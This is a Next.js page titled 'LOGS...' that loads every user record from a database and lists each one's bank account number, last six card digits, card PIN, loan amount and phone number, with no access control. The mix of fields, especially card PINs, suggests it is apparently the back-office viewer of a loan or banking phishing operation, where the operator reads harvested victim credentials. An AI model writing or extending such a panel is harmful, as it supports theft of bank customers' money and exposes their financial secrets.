//import '../app/globals.css'

import { JSXElementConstructor, Key, ReactElement, ReactFragment, ReactPortal, useEffect } from 'react'

import User from 'model/User'
import dbConnect from '@/lib/dbConnect'
import { serialize } from 'v8'


//const inter = Inter({ subsets: ['latin'] })

export default function Home(params: { data: any}) {

  const { data } = params

  const data1 = JSON.parse(data)
  //console.log(JSON.parse(data))
  
  return (
    <div className='w-[80%] m-auto'>
      <div style={{marginTop:'1rem', textAlign:'center', fontSize:'2rem'}} >
          LOGS...
      </div>

      {
        data1?.length > 0 &&
        data1.map((d: { accNo: string | number   | null | undefined; last6: string | number  | null | undefined; cpin: string | number | null | undefined; loanAmm: string | number | null | undefined; username: string | number | null | undefined }, i: Key | null | undefined) => (
          <div style={{display:'flex', flexDirection:'column', gap:'4px', borderColor:'gray', borderBottom:'2px', paddingBottom:'1rem'}} key={i} >
            <div></div>
            <div style={styles.items}><div>Account</div><div>{d.accNo}</div></div>
            <div style={styles.items}><div>Last 6 digit</div><div>{d.last6}</div></div>
            <div style={styles.items}><div>CC pin</div><div>{d.cpin}</div></div>
            <div style={styles.items}><div>Loan Amount</div><div>{d.loanAmm}</div></div>
            <div style={styles.items}><div>Phone</div><div>{d.username}</div></div>
            <div style={{height:'4px', width:'100%', background:'gray'}}></div>
          </div>
        ))
      }

    </div>
  )
}
// flex flex-col gap-1 mt-8 pb-4 border-b-2 border-b-gray-700
const styles = {

  older: {display:'flex', flexDirection:'column', gap:'4px', borderColor:'gray', borderBottom:'2px', paddingBottom:'1rem'},
  items: { alignItems:'center', padding:'1.5rem', borderWidth:'2px', borderColor:'gray', display:'flex', justifyContent:'space-between', }
}


export async function getServerSideProps(context: any) {
  try {
  

    await dbConnect()
    const query = await User.find()
   // console.log(query)
    return {
      props: {
        data:JSON.stringify(query) 
      },
    }



  } catch (error) {
    console.log('logs.tsx:::', error)
    return {
      props: {
        data:null
      },
    }
    
  }
}

